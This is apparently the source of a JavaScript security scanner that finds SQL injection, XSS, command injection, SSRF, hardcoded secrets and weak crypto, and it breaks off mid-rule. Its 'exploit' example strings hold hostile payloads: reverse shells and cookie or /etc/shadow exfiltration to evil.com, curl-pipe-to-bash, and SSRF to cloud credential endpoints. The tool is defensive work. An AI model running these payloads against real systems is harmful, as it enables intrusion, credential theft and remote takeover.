/* ════════════════════════════════════════════════════════════════
   SecureScan v4 — Deep Intelligence Code Analysis Engine
   AST + CFG + Call Graph + Inter-Procedural Taint + Intelligence
   Full taint lifecycle, exploit examples, remediation snippets
   ════════════════════════════════════════════════════════════════ */

SecureScanAnalyzer.analyzeCode = function (code) {
    const issues = [];
    const lines = code.split('\n');
    const lowerCode = code.toLowerCase();

    // ═══════════════════════════════════════════════════════════
    //  PHASE 0: Deep Program Analysis (AST Engine + Intelligence)
    // ═══════════════════════════════════════════════════════════
    let deepAnalysis = null, frameworkContext = null, cveMatches = [], anomalies = [];
    try {
        if (typeof ASTEngine !== 'undefined') {
            deepAnalysis = ASTEngine.analyze(code);
        }
        if (typeof IntelligenceEngine !== 'undefined') {
            frameworkContext = IntelligenceEngine.detectFramework(code);
            cveMatches = IntelligenceEngine.correlateCVEs(code);
            anomalies = IntelligenceEngine.detectAnomalies(code, deepAnalysis);
        }
    } catch (e) { /* graceful fallback to pattern-only analysis */ }

    // ═══════════════════════════════════════════════════════════
    //  PHASE 1: Language & Inventory Detection (Context Awareness)
    // ═══════════════════════════════════════════════════════════
    const lang = this._detectLanguage(code);

    // V5: Context-Aware Inventory Scan
    const inventory = {
        hasMongo: /mongoose|mongodb|MongoClient/i.test(code),
        hasSQL: /sequelize|mysql|pg|knex|sqlite|typeorm/i.test(code),
        hasJWT: /jsonwebtoken|jwt-simple|jose|jwt-decode/i.test(code),
        hasExpress: /express\s*\(|express\s*require/i.test(code)
    };

    // ═══════════════════════════════════════════════════════════
    //  PHASE 2: Lightweight Tokenization & Variable Tracking
    //  with SANITIZATION DETECTION
    // ═══════════════════════════════════════════════════════════
    const vars = {};          // variable name → { value, tainted, line, sanitized }
    const taintSources = [];  // lines where user input enters
    const taintSinks = [];    // lines where tainted data is used dangerously

    const SOURCE_PATTERNS = [
        /req\.(body|params|query|headers|cookies)\b/,
        /request\.(form|args|json|values|data|files)\b/,
        /\$_(GET|POST|REQUEST|COOKIE|SERVER|FILES)\b/,
        /process\.(argv|env)\b/,
        /input\s*\(/, /raw_input\s*\(/, /scanf\s*\(/, /gets\s*\(/,
        /getParameter\s*\(/, /getHeader\s*\(/,
        /useSearchParams|useParams|searchParams/,
        /event\.(target|currentTarget)\.value/,
        /document\.(getElementById|querySelector|getElementsBy)\b.*?\.value/,
        /FormData|URLSearchParams/
    ];

    // Sanitization functions that BREAK the taint chain
    const SANITIZERS = [
        /\.replace\s*\(.*?([\/<>'"&]|script|html)/i,
        /escape\s*\(/i, /encodeURI(Component)?\s*\(/i,
        /htmlspecialchars\s*\(/i, /htmlentities\s*\(/i,
        /DOMPurify\.sanitize\s*\(/i, /sanitize\s*\(/i,
        /\.trim\s*\(\)\.replace/i,
        /validator\.\w+\s*\(/i,
        /parseInt\s*\(/i, /parseFloat\s*\(/i, /Number\s*\(/i,
        /\.match\s*\(\s*\/\^/i, /\.test\s*\(/i,
        /prepared\s*statement/i, /parameterized/i,
        /\?\s*,\s*\[/,  // parameterized query: db.query("SELECT ?", [val])
        /\.createTextNode\s*\(/i,
        /textContent\s*=/i,
        /escapeHtml\s*\(/i,
        /xss\s*\(/i,
        /Joi\.\w+|yup\.\w+|zod\.\w+/i,
    ];

    const SINK_PATTERNS = [
        { regex: /\b(query|execute|raw|prepare)\s*\(/, type: 'sql', cwe: 'CWE-89' },
        { regex: /\.innerHTML\s*=|\.outerHTML\s*=|document\.write\s*\(|dangerouslySetInnerHTML|v-html/, type: 'xss', cwe: 'CWE-79' },
        { regex: /\beval\s*\(|\bnew\s+Function\s*\(|setTimeout\s*\(\s*['"`]|setInterval\s*\(\s*['"`]/, type: 'code_exec', cwe: 'CWE-94' },
        // Expanded RCE sinks handled by specialized RCE_PATTERNS below, but kept here for general taint flow coverage
        { regex: /child_process|\.exec\s*\(|\bexec\s*\(|\.execSync\s*\(|\.spawn\s*\(|os\.system\s*\(|subprocess\.(call|run|Popen)|Runtime\.getRuntime\(\)\.exec|os\.popen/, type: 'cmd_injection', cwe: 'CWE-78' },
        { regex: /readFile|readFileSync|createReadStream|writeFile|unlink|rmdir|fs\.\w+\s*\(|open\s*\(.*?,\s*['"]r/, type: 'path_traversal', cwe: 'CWE-22' },
        { regex: /fetch\s*\(|axios\.\w+\s*\(|http\.get\s*\(|urllib|requests\.(get|post)|HttpClient|WebClient/, type: 'ssrf', cwe: 'CWE-918' },
        { regex: /redirect\s*\(|res\.redirect\s*\(|location\.href\s*=|window\.location\s*=|header\s*\(\s*['"]Location/, type: 'open_redirect', cwe: 'CWE-601' },
        { regex: /pickle\.loads|yaml\.load\s*\((?!.*Loader)|unserialize\s*\(|ObjectInputStream|JSON\.parse\s*\(.*req\./, type: 'deserialization', cwe: 'CWE-502' },
    ];

    // V5: Critical RCE Detection Patterns (High Precision)
    const RCE_PATTERNS = [
        { regex: /(?:child_process|cp)\.(?:exec|execSync|spawn|spawnSync)\s*\(\s*[^,)]*(?:req\.|params|query|body|argv|cmd|command)/, name: 'Node.js Command Execution' },
        { regex: /os\.(?:system|popen)\s*\(\s*[^,)]*(?:req\.|params|query|body|argv|cmd)/, name: 'Python OS Command Execution' },
        { regex: /subprocess\.(?:call|run|Popen|check_output)\s*\(\s*[^,)]*(?:req\.|params|query|body|argv|cmd)/, name: 'Python Subprocess Execution' },
        { regex: /eval\s*\(\s*[^,)]*(?:req\.|params|query|body)/, name: 'Dynamic Code Evaluation' },
        { regex: /\bexec\s*\(\s*[^,)]*(?:req\.|params|query|body)/, name: 'Dynamic Code Execution' }
    ];

    // Track tainted variables across lines with sanitization awareness
    for (let i = 0; i < lines.length; i++) {
        const line = lines[i];
        const trimmed = line.trim();
        if (!trimmed || trimmed.startsWith('//') || trimmed.startsWith('#') || trimmed.startsWith('*')) continue;

        // Check if this line has a user-input source
        const isTaintSource = SOURCE_PATTERNS.some(p => p.test(line));
        if (isTaintSource) {
            taintSources.push(i + 1);
            const assignMatch = line.match(/(?:const|let|var|)\s*(\w+)\s*=/) || line.match(/(\w+)\s*=\s*/);
            if (assignMatch) {
                // Check if the source is immediately sanitized on the same line
                const isSanitized = SANITIZERS.some(s => s.test(line));
                vars[assignMatch[1]] = { tainted: !isSanitized, sanitized: isSanitized, line: i + 1, source: trimmed };
            }
        }

        // Track variable assignments that propagate OR sanitize taint
        const assignMatch = line.match(/(?:const|let|var|)\s*(\w+)\s*=\s*(.+)/);
        if (assignMatch && !isTaintSource) {
            const varName = assignMatch[1];
            const rhs = assignMatch[2];
            const refsTainted = Object.keys(vars).some(v => vars[v].tainted && new RegExp('\\b' + v + '\\b').test(rhs));
            if (refsTainted) {
                // Check if the assignment SANITIZES the tainted data
                const isSanitized = SANITIZERS.some(s => s.test(rhs));
                if (isSanitized) {
                    vars[varName] = { tainted: false, sanitized: true, line: i + 1, source: trimmed, wasClean: true };
                } else {
                    vars[varName] = { tainted: true, line: i + 1, source: trimmed, propagated: true };
                }
            }
        }

        // Check if tainted data flows into a sink
        for (const sink of SINK_PATTERNS) {
            if (sink.regex.test(line)) {
                // Check for inline sanitization at the sink itself
                const sinkSanitized = SANITIZERS.some(s => s.test(line));
                if (sinkSanitized) continue;

                const usedTaintedVar = Object.keys(vars).find(v => vars[v].tainted && new RegExp('\\b' + v + '\\b').test(line));
                const directTaint = SOURCE_PATTERNS.some(p => p.test(line));

                if (usedTaintedVar || directTaint) {
                    const sourceVar = usedTaintedVar ? vars[usedTaintedVar] : null;
                    taintSinks.push({
                        line: i + 1, type: sink.type, cwe: sink.cwe,
                        variable: usedTaintedVar,
                        sourceLine: sourceVar?.line,
                        sourceCode: sourceVar?.source,
                        sinkCode: trimmed
                    });
                }
            }
        }

        // V5: Critical RCE Pattern Check (Instant Critical Flag)
        for (const rce of RCE_PATTERNS) {
            if (rce.regex.test(line)) {
                const issue = {
                    id: 'rce-' + (i + 1),
                    name: 'Remote Code Execution (RCE)',
                    description: `Critical: ${rce.name} detected. This allows arbitrary system command execution.`,
                    severity: 'critical',
                    location: `Line ${i + 1}`,
                    line: i + 1,
                    col: 0,
                    confidence: 'confirmed', // High confidence due to pattern specificity
                    snippet: line.trim(),
                    cwe: 'CWE-78',
                    owasp: 'A03',
                    exploit: 'Attacker can execute: rm -rf / or cat /etc/passwd',
                    remediation: 'Avoid executing system commands. Use specific libraries or strict allowlists.',
                    _v5_rce: true // Flag for V5 weighted scoring
                };
                // Push immediately, scoring will handle deduplication/weighting
                issues.push(issue);
            }
        }
    }

    // ═══════════════════════════════════════════════════════════
    //  PHASE 3: Generate Data-Flow Confirmed Issues
    //  with EXPLOIT EXAMPLES and REMEDIATION SNIPPETS
    // ═══════════════════════════════════════════════════════════
    const TAINT_ISSUE_MAP = {
        sql: {
            severity: 'critical', name: 'SQL Injection — Data Flow Confirmed',
            owasp: 'A03',
            description: 'Untrusted user input flows directly into a SQL query without parameterization. An attacker can inject SQL commands to extract, modify, or destroy database data.',
            fix: 'Use parameterized queries: db.query("SELECT * FROM users WHERE id = ?", [userId]). Never concatenate variables into SQL.',
            exploit: '# Attack payload:\ncurl -X POST /api/users -d \'id=1; DROP TABLE users; --\'\n\n# What the attacker sends as input:\n\' OR 1=1 --\n\' UNION SELECT username, password FROM admin_users --',
            remediation: '// BEFORE (vulnerable):\nconst query = `SELECT * FROM users WHERE id = ${userId}`;\n\n// AFTER (secure):\nconst query = "SELECT * FROM users WHERE id = ?";\ndb.query(query, [userId]);'
        },
        xss: {
            severity: 'high', name: 'Cross-Site Scripting (XSS) — Data Flow Confirmed',
            owasp: 'A03',
            description: 'User-controlled data is rendered directly into the DOM without escaping, allowing script injection.',
            fix: 'Use textContent instead of innerHTML. Escape all output with DOMPurify. Set Content-Security-Policy headers.',
            exploit: '# Stored XSS payload:\n<script>fetch("https://evil.com/steal?c="+document.cookie)</script>\n\n# Event-based XSS:\n<img src=x onerror="alert(document.domain)">\n\n# DOM-based XSS:\n"><svg/onload=fetch("//evil.com?"+document.cookie)>',
            remediation: '// BEFORE (vulnerable):\nelement.innerHTML = userInput;\n\n// AFTER (secure):\nelement.textContent = userInput;\n// Or if HTML is needed:\nelement.innerHTML = DOMPurify.sanitize(userInput);'
        },
        code_exec: {
            severity: 'critical', name: 'Code Injection — Data Flow Confirmed',
            owasp: 'A03',
            description: 'User input reaches eval() or dynamic code execution, allowing arbitrary code execution.',
            fix: 'Eliminate eval() entirely. Use JSON.parse() for data, and safe expression parsers for calculated fields.',
            exploit: '# Payload to execute arbitrary code:\nrequire("child_process").execSync("cat /etc/passwd")\n\n# Node.js reverse shell:\nrequire("net").connect(4444,"evil.com",function(){require("child_process").exec("/bin/sh")})',
            remediation: '// BEFORE (vulnerable):\nconst result = eval(userExpression);\n\n// AFTER (secure):\nconst result = JSON.parse(userExpression);\n// Or use a safe math parser:\nconst result = mathjs.evaluate(userExpression);'
        },
        cmd_injection: {
            severity: 'critical', name: 'OS Command Injection — Data Flow Confirmed',
            owasp: 'A03',
            description: 'User input is passed to a shell command. An attacker can execute arbitrary system commands.',
            fix: 'Use execFile() with an explicit command and argument array. Never pass user input to a shell.',
            exploit: '# Payload to read system files:\n; cat /etc/passwd\n\n# Reverse shell:\n; bash -c "bash -i >& /dev/tcp/evil.com/4444 0>&1"\n\n# Data exfiltration:\n| curl https://evil.com/steal -d @/etc/shadow',
            remediation: '// BEFORE (vulnerable):\nexec(`ping ${userHost}`);\n\n// AFTER (secure):\nexecFile("ping", ["-c", "4", userHost], callback);\n// Always use execFile with argument arrays'
        },
        path_traversal: {
            severity: 'critical', name: 'Path Traversal — Data Flow Confirmed',
            owasp: 'A01',
            description: 'User-supplied file paths are used without validation, allowing directory traversal attacks.',
            fix: 'Resolve paths with path.resolve() and verify they stay inside the allowed base directory.',
            exploit: '# Read system files:\nGET /api/files?name=../../../etc/passwd\n\n# Read application secrets:\nGET /api/files?name=../../../.env\n\n# Windows variant:\nGET /api/files?name=..\\..\\..\\windows\\system32\\config\\sam',
            remediation: '// BEFORE (vulnerable):\nconst filePath = "./uploads/" + req.params.name;\nfs.readFile(filePath, callback);\n\n// AFTER (secure):\nconst safePath = path.resolve("./uploads", req.params.name);\nif (!safePath.startsWith(path.resolve("./uploads"))) {\n  return res.status(403).send("Forbidden");\n}\nfs.readFile(safePath, callback);'
        },
        ssrf: {
            severity: 'high', name: 'Server-Side Request Forgery (SSRF) — Data Flow Confirmed',
            owasp: 'A10',
            description: 'User-controlled URLs are fetched server-side, allowing access to internal services.',
            fix: 'Validate URLs against an allowlist. Block private IP ranges.',
            exploit: '# Access AWS metadata:\nGET /api/proxy?url=http://169.254.169.254/latest/meta-data/\n\n# Port scan internal network:\nGET /api/proxy?url=http://192.168.1.1:8080/admin\n\n# Access internal services:\nGET /api/proxy?url=http://localhost:6379/INFO',
            remediation: '// BEFORE (vulnerable):\nconst resp = await fetch(req.query.url);\n\n// AFTER (secure):\nconst allowedHosts = ["api.example.com", "cdn.example.com"];\nconst parsed = new URL(req.query.url);\nif (!allowedHosts.includes(parsed.hostname)) {\n  return res.status(403).send("Blocked");\n}\nconst resp = await fetch(req.query.url);'
        },
        open_redirect: {
            severity: 'medium', name: 'Open Redirect — Data Flow Confirmed',
            owasp: 'A01',
            description: 'User input controls a redirect URL, enabling phishing through your domain.',
            fix: 'Validate redirect URLs against a whitelist of allowed destinations.',
            exploit: '# Phishing redirect:\nhttps://yourapp.com/redirect?url=https://evil-login.com\n\n# Protocol trick:\nhttps://yourapp.com/redirect?url=//evil.com\n\n# Double encoding:\nhttps://yourapp.com/redirect?url=%68%74%74%70%73://evil.com',
            remediation: '// BEFORE (vulnerable):\nres.redirect(req.query.url);\n\n// AFTER (secure):\nconst allowedPaths = ["/dashboard", "/profile", "/home"];\nif (allowedPaths.includes(req.query.url)) {\n  res.redirect(req.query.url);\n} else {\n  res.redirect("/dashboard");\n}'
        },
        deserialization: {
            severity: 'critical', name: 'Insecure Deserialization — Data Flow Confirmed',
            owasp: 'A08',
            description: 'Untrusted data is deserialized, potentially allowing arbitrary code execution.',
            fix: 'Never deserialize untrusted data with native serializers. Use JSON with strict schema validation.',
            exploit: '# Python pickle RCE:\nimport pickle, os\nclass Exploit:\n  def __reduce__(self):\n    return (os.system, ("whoami",))\npickle.dumps(Exploit())\n\n# PHP object injection:\nO:8:"Exploit":1:{s:3:"cmd";s:6:"whoami";}',
            remediation: '// BEFORE (vulnerable):\nconst data = yaml.load(userInput);\n\n// AFTER (secure):\nconst data = JSON.parse(userInput);\n// Validate with schema:\nconst schema = Joi.object({ name: Joi.string(), age: Joi.number() });\nconst validated = schema.validate(data);'
        }
    };

    for (const sink of taintSinks) {
        const info = TAINT_ISSUE_MAP[sink.type];
        if (!info) continue;

        // Build data-flow trace array for visualization
        const dataFlowArr = [];
        if (sink.sourceLine) {
            dataFlowArr.push(`Line ${sink.sourceLine}: ${sink.sourceCode}`);
            // Check for intermediate propagation
            const intermediates = Object.entries(vars)
                .filter(([, v]) => v.propagated && v.line > sink.sourceLine && v.line < sink.line)
                .sort((a, b) => a[1].line - b[1].line);
            for (const [name, v] of intermediates) {
                dataFlowArr.push(`Line ${v.line}: ${v.source} (via ${name})`);
            }
        }
        dataFlowArr.push(`Line ${sink.line}: ${sink.sinkCode} (SINK)`);

        const flowTrace = sink.sourceLine
            ? `⛓️ Data Flow: Line ${sink.sourceLine} (source) → Line ${sink.line} (sink)\n📥 Source: ${sink.sourceCode}\n📤 Sink: ${sink.sinkCode}`
            : `📤 Direct tainted input at Line ${sink.line}: ${sink.sinkCode}`;

        issues.push({
            severity: info.severity, name: info.name,
            location: `Line ${sink.line}`,
            description: info.description,
            snippet: flowTrace,
            fix: info.fix,
            exploit: info.exploit,
            remediation: info.remediation,
            cwe: sink.cwe, owasp: info.owasp,
            confidence: 'confirmed',
            attackVector: 'network',
            dataFlow: dataFlowArr
        });
    }

    // ═══════════════════════════════════════════════════════════
    //  PHASE 4: Pattern-based rules (catch what taint misses)
    //  Now with EXPLOIT EXAMPLES and REMEDIATION SNIPPETS
    // ═══════════════════════════════════════════════════════════
    const rules = [
        // ── A03: Injection ──
        {
            patterns: [
                /(['"`])\s*(SELECT|INSERT|UPDATE|DELETE|DROP|ALTER|CREATE|EXEC)\b.*?\1\s*\+/gi,
                /\+\s*['"`]?\s*(SELECT|INSERT|UPDATE|DELETE|DROP|ALTER)\b/gi,
                /f['"`].*?(SELECT|INSERT|UPDATE|DELETE).*?\{/gi,
                /format\s*\(.*?(SELECT|INSERT|UPDATE|DELETE)/gi,
                /\$\{.*?\}.*?(SELECT|INSERT|UPDATE|DELETE)/gi,
                /(SELECT|INSERT|UPDATE|DELETE).*?\$\{/gi,
            ],
            severity: 'critical', name: 'SQL Injection Risk',
            cwe: 'CWE-89', owasp: 'A03', confidence: 'likely', attackVector: 'network',
            description: 'String concatenation or interpolation detected in SQL queries. This pattern may allow SQL injection if user input is involved.',
            fix: 'Use parameterized queries or ORM methods. Never build SQL strings with concatenation.',
            exploit: "# Typical SQL injection payload:\n' OR '1'='1' --\n' UNION SELECT null, username, password FROM users --",
            remediation: '// Use parameterized queries:\ndb.query("SELECT * FROM users WHERE id = ?", [id]);',
            _checkCondition: function (code) { return inventory.hasSQL; }
        },
        {
            patterns: [/\.innerHTML\s*=\s*(?!['"`]\s*$|''|"")/gi, /document\.write\s*\(/gi, /dangerouslySetInnerHTML/gi, /v-html\s*=/gi],
            severity: 'high', name: 'Cross-Site Scripting (XSS) Risk',
            cwe: 'CWE-79', owasp: 'A03', confidence: 'likely', attackVector: 'network',
            description: 'Direct DOM manipulation with unsanitized content. If any user-controlled data reaches this statement, XSS is possible.',
            fix: 'Use textContent/innerText instead of innerHTML. Sanitize with DOMPurify if HTML is required.',
            exploit: '<script>document.location="https://evil.com?c="+document.cookie</script>',
            remediation: '// Use textContent:\nel.textContent = userInput;\n// Or sanitize:\nel.innerHTML = DOMPurify.sanitize(userInput);'
        },
        {
            patterns: [/\beval\s*\(/gi, /new\s+Function\s*\(/gi],
            severity: 'critical', name: 'Dynamic Code Execution',
            cwe: 'CWE-95', owasp: 'A03', confidence: 'likely', attackVector: 'network',
            description: 'eval() or new Function() executes arbitrary code. If any external data reaches these, full code injection is possible.',
            fix: 'Remove eval(). Use JSON.parse() for JSON data. Use a safe math parser for expressions.',
            exploit: '// Payload: require("child_process").execSync("id").toString()',
            remediation: '// Replace eval:\nconst data = JSON.parse(input);\n// For math: const result = mathjs.evaluate(expr);'
        },
        {
            patterns: [/child_process.*?\bexec\b/gi, /os\.system\s*\(/gi, /subprocess\.(call|run|Popen)\s*\(/gi, /Runtime\.getRuntime\(\)\.exec/gi, /shell\s*=\s*True/gi],
            severity: 'critical', name: 'OS Command Execution',
            cwe: 'CWE-78', owasp: 'A03', confidence: 'likely', attackVector: 'network',
            description: 'Shell command execution detected. If any user input reaches the command string, full system compromise is possible.',
            fix: 'Use execFile() with argument arrays. Never pass user input to shell commands.',
            exploit: '# Payload: ; curl https://evil.com/shell.sh | bash',
            remediation: '// Use execFile with args array:\nexecFile("ls", ["-la", dir], callback);'
        },
        // ── A02: Cryptographic Failures ──
        {
            patterns: [/['"`](sk-|sk_live_|pk_live_|AKIA|ghp_|gho_|glpat-|xox[bpsa]-|Bearer\s+ey)[a-zA-Z0-9\-_.]{10,}['"`]/gi,
                /\b(api[_-]?key|api[_-]?secret|access[_-]?token|auth[_-]?token|secret[_-]?key|private[_-]?key)\s*[:=]\s*['"`][a-zA-Z0-9\-_.\\/+=]{10,}['"`]/gi,
                /\b(AWS_SECRET|STRIPE_KEY|STRIPE_SECRET|SENDGRID_API|TWILIO_AUTH|MAILGUN|FIREBASE_KEY|DATABASE_URL|MONGO_URI)\w*\s*[:=]\s*['"`][^'"`]{10,}['"`]/gi],
            severity: 'critical', name: 'Hardcoded Secret / API Key',
            cwe: 'CWE-798', owasp: 'A02', confidence: 'confirmed', attackVector: 'network',
            description: 'A secret key or token is hardcoded in source code. Anyone with code access can steal this credential.',
            fix: 'Move to environment variables. Use a secrets manager. Rotate exposed keys immediately.',
            exploit: '# Attacker clones repo and extracts keys:\ngit log --all -p | grep -i "api_key\\|secret\\|password"',
            remediation: '// BEFORE: const key = "sk-abc123...";\n// AFTER:\nconst key = process.env.API_KEY;\n// Add to .env (in .gitignore):\n// API_KEY=sk-abc123...'
        },
        {
            patterns: [/\b(password|passwd|pwd|pass|db_pass)\s*[:=]\s*['"`][^'"`]{2,}['"`]/gi],
            severity: 'high', name: 'Hardcoded Password',
            cwe: 'CWE-259', owasp: 'A02', confidence: 'confirmed', attackVector: 'local',
            description: 'A password is hardcoded in source code, visible to anyone who can read the codebase.',
            fix: 'Use environment variables for all passwords. Store in .env files (added to .gitignore).',
            exploit: '# Found in git history even after deletion:\ngit log --all --diff-filter=D -- "*.env"',
            remediation: '// BEFORE: const dbPass = "s3cret!";\n// AFTER:\nconst dbPass = process.env.DB_PASSWORD;'
        },
        {
            patterns: [/createHash\s*\(\s*['"`](md5|sha1)['"`]/gi, /\b(md5|sha1)\s*\(/gi, /hashlib\.(md5|sha1)\s*\(/gi, /MessageDigest\.getInstance\s*\(\s*['"`](MD5|SHA-1)['"`]/gi],
            severity: 'high', name: 'Weak Cryptographic Hash',
            cwe: 'CWE-327', owasp: 'A02', confidence: 'confirmed', attackVector: 'network',
            description: 'MD5 or SHA1 are cryptographically broken and vulnerable to collision attacks.',
            fix: 'Use SHA-256+ for integrity. Use bcrypt/argon2id for passwords.',
            exploit: '# MD5 collision generator:\n# hashclash can generate two files with the same MD5\n# Rainbow tables crack MD5 passwords in seconds',
            remediation: '// BEFORE: crypto.createHash("md5").update(password);\n// AFTER (password hashing):\nconst hash = await bcrypt.hash(password, 12);\n// AFTER (integrity):\ncrypto.createHash("sha256").update(data);'
        },
        {
            patterns: [/\bDES\b|RC4|RC2|\bECB\b|Blowfish/gi],
            severity: 'high', name: 'Weak Encryption Algorithm',
            cwe: 'CWE-326', owasp: 'A02', confidence: 'confirmed', attackVector: 'network',
            description: 'Deprecated encryption algorithms (DES, RC4, ECB mode) have known attacks.',
            fix: 'Use AES-256 with GCM mode. Never use ECB mode.',
            exploit: '# ECB mode leaks patterns — identical blocks produce identical ciphertext\n# DES brute-force: ~6 hours on modern hardware',
            remediation: '// Use AES-256-GCM:\nconst cipher = crypto.createCipheriv("aes-256-gcm", key, iv);'
        },
        {
            patterns: [/Math\.random\s*\(\s*\).*?(token|secret|key|password|salt|hash|session|id|uuid|nonce)/gi],
            severity: 'medium', name: 'Insecure Random Number Generator',
            cwe: 'CWE-338', owasp: 'A02', confidence: 'confirmed', attackVector: 'network',
            description: 'Math.random() is not cryptographically secure — its output is predictable.',
            fix: 'Use crypto.randomBytes() or crypto.randomUUID().',
            exploit: '# Math.random() uses xorshift128+ — state is recoverable from ~600 outputs\n# Tokens generated this way can be predicted',
            remediation: '// BEFORE: const token = Math.random().toString(36);\n// AFTER:\nconst token = crypto.randomUUID();\n// Or: crypto.randomBytes(32).toString("hex");'
        },
        // ── A01: Broken Access Control ──
        {
            patterns: [/app\.(get|post|put|delete|patch)\s*\(\s*['"`]\/admin/gi, /router\.(get|post|put|delete)\s*\(\s*['"`]\/admin/gi],
            severity: 'high', name: 'Potentially Unprotected Admin Route',
            cwe: 'CWE-862', owasp: 'A01', confidence: 'possible', attackVector: 'network',
            description: 'An admin endpoint is defined. Verify that proper authentication and authorization middleware protects this route.',
            fix: 'Add authentication middleware before admin routes.',
            remediation: '// Add auth middleware:\napp.get("/admin", requireAuth, requireAdmin, handler);'
        },
        {
            patterns: [/cors\s*\(\s*\)/gi, /Access-Control-Allow-Origin.*?\*/gi, /origin:\s*['"`]\*['"`]/gi, /credentials:\s*true.*?origin:\s*true/gi],
            severity: 'medium', name: 'Overly Permissive CORS',
            cwe: 'CWE-942', owasp: 'A05', confidence: 'confirmed', attackVector: 'network',
            description: 'CORS allows all origins (*), enabling any website to make authenticated requests to your API.',
            fix: 'Restrict origins: cors({ origin: "https://yourdomain.com" }).',
            exploit: '// Any site can steal data:\nfetch("https://your-api.com/user", {credentials:"include"}).then(r=>r.json())',
            remediation: '// BEFORE: app.use(cors());\n// AFTER:\napp.use(cors({ origin: "https://yourdomain.com" }));'
        },
        // ── A05: Security Misconfiguration ──
        {
            patterns: [/rejectUnauthorized\s*:\s*false/gi, /NODE_TLS_REJECT_UNAUTHORIZED\s*=\s*['"`]?0/gi, /verify\s*=\s*False/gi],
            severity: 'critical', name: 'SSL/TLS Verification Disabled',
            cwe: 'CWE-295', owasp: 'A05', confidence: 'confirmed', attackVector: 'adjacent',
            description: 'SSL certificate verification is disabled, allowing man-in-the-middle attacks.',
            fix: 'Never disable SSL verification in production. Install valid certificates.',
            exploit: '# MITM attack intercepts all "encrypted" traffic\n# Tools: mitmproxy, Burp Suite, sslstrip',
            remediation: '// Remove rejectUnauthorized: false\n// Install proper certificates from Let\'s Encrypt'
        },
        {
            patterns: [/debug\s*[:=]\s*(true|1|True|['"`]true['"`])/gi, /DEBUG\s*=\s*(True|1|true)/gi],
            severity: 'high', name: 'Debug Mode Enabled',
            cwe: 'CWE-215', owasp: 'A05', confidence: 'likely', attackVector: 'network',
            description: 'Debug mode exposes stack traces, internal paths, and environment variables.',
            fix: 'Disable debug in production. Use: debug: process.env.NODE_ENV !== "production".',
            remediation: '// Use environment-based config:\nconst debug = process.env.NODE_ENV !== "production";'
        },
        {
            patterns: [/console\.(log|debug|info)\s*\(.*?(password|secret|token|key|auth|credential|ssn|credit|card_number|cvv)/gi],
            severity: 'medium', name: 'Sensitive Data in Logs',
            cwe: 'CWE-532', owasp: 'A09', confidence: 'likely', attackVector: 'local',
            description: 'Sensitive data is logged. Log files may be accessible to unauthorized users.',
            fix: 'Never log sensitive data. Use a structured logger with field redaction.',
            remediation: '// BEFORE: console.log("User login", { password });\n// AFTER:\nlogger.info("User login", { userId: user.id });'
        },
        // ── A04: Insecure Design ──
        {
            patterns: [/catch\s*\(\s*\w*\s*\)\s*\{\s*\}/gi, /\.catch\s*\(\s*\(\s*\)\s*=>\s*\{\s*\}\s*\)/gi],
            severity: 'low', name: 'Empty Error Handler',
            cwe: 'CWE-390', owasp: 'A04', confidence: 'confirmed', attackVector: 'local',
            description: 'Errors are silently swallowed, hiding failures and security events.',
            fix: 'Log errors and return appropriate responses.',
            remediation: '// BEFORE: catch(e) {}\n// AFTER:\ncatch(err) {\n  logger.error("Operation failed", { error: err.message });\n  res.status(500).json({ error: "Internal error" });\n}'
        },
        {
            patterns: [/res\.(send|json)\s*\(\s*\{?\s*error.*?(stack|trace|sqlMessage|errno|code)/gi, /traceback\.print_exc/gi, /e\.printStackTrace\s*\(/gi],
            severity: 'medium', name: 'Verbose Error Messages',
            cwe: 'CWE-209', owasp: 'A04', confidence: 'likely', attackVector: 'network',
            description: 'Detailed error messages expose internal architecture to attackers.',
            fix: 'Return generic error messages. Log details server-side only.',
            remediation: '// BEFORE: res.json({ error: err.stack });\n// AFTER:\nlogger.error(err);\nres.status(500).json({ error: "Something went wrong" });'
        },
        // ── A07: Auth Failures ──
        {
            patterns: [/jwt\.sign\s*\(.*?expiresIn.*?(365|8760|never|'100y')/gi, /maxAge\s*:\s*\d{10,}/gi],
            severity: 'medium', name: 'Excessive Session Duration',
            cwe: 'CWE-613', owasp: 'A07', confidence: 'likely', attackVector: 'network',
            description: 'Sessions or tokens have excessively long lifetimes.',
            fix: 'Set reasonable expiration: JWTs (1-24h), sessions (30 min idle timeout).',
            remediation: '// Use short-lived tokens with refresh:\njwt.sign(payload, secret, { expiresIn: "1h" });'
        },
        {
            patterns: [/secure\s*:\s*false/gi, /httpOnly\s*:\s*false/gi],
            severity: 'medium', name: 'Insecure Cookie Configuration',
            cwe: 'CWE-614', owasp: 'A07', confidence: 'confirmed', attackVector: 'network',
            description: 'Session cookies are missing Secure or HttpOnly flags.',
            fix: 'Set: { secure: true, httpOnly: true, sameSite: "strict" }.',
            exploit: '// XSS can steal cookies without httpOnly:\ndocument.cookie // accessible to scripts',
            remediation: '// Secure cookie config:\nres.cookie("session", token, {\n  secure: true,\n  httpOnly: true,\n  sameSite: "strict",\n  maxAge: 3600000\n});'
        },
        // ── A08: Integrity Failures ──
        {
            patterns: [/pickle\.loads?\s*\(/gi, /yaml\.load\s*\([^)]*\)(?!.*Loader)/gi, /unserialize\s*\(/gi, /ObjectInputStream/gi],
            severity: 'critical', name: 'Insecure Deserialization',
            cwe: 'CWE-502', owasp: 'A08', confidence: 'likely', attackVector: 'network',
            description: 'Native deserialization of untrusted data can lead to remote code execution.',
            fix: 'Use JSON with schema validation instead of native serialization.',
            remediation: '# BEFORE: data = pickle.loads(user_input)\n# AFTER:\nimport json\ndata = json.loads(user_input)\nschema.validate(data)'
        },
        // ── A10: SSRF ──
        {
            patterns: [/fetch\s*\(\s*(req\.|request\.|params|query|body|input|user)/gi, /axios\.\w+\s*\(\s*(req\.|params|query|body)/gi],
            severity: 'high', name: 'Server-Side Request Forgery (SSRF) Risk',
            cwe: 'CWE-918', owasp: 'A10', confidence: 'likely', attackVector: 'network',
            description: 'User-controlled input is used in a server-side HTTP request.',
            fix: 'Validate URLs against a strict allowlist. Block private IP ranges.',
            exploit: 'GET /proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/',
            remediation: '// Validate URL before fetching:\nconst url = new URL(req.query.url);\nif (isPrivateIP(url.hostname)) throw new Error("Blocked");'
        },
        // ── Misc ──
        {
            patterns: [/http:\/\/(?!localhost|127\.0\.0\.1|0\.0\.0\.0)/gi],
            severity: 'low', name: 'Insecure HTTP Connection',
            cwe: 'CWE-319', owasp: 'A02', confidence: 'possible', attackVector: 'adjacent',
            description: 'HTTP (unencrypted) URLs are used. Data can be intercepted.',
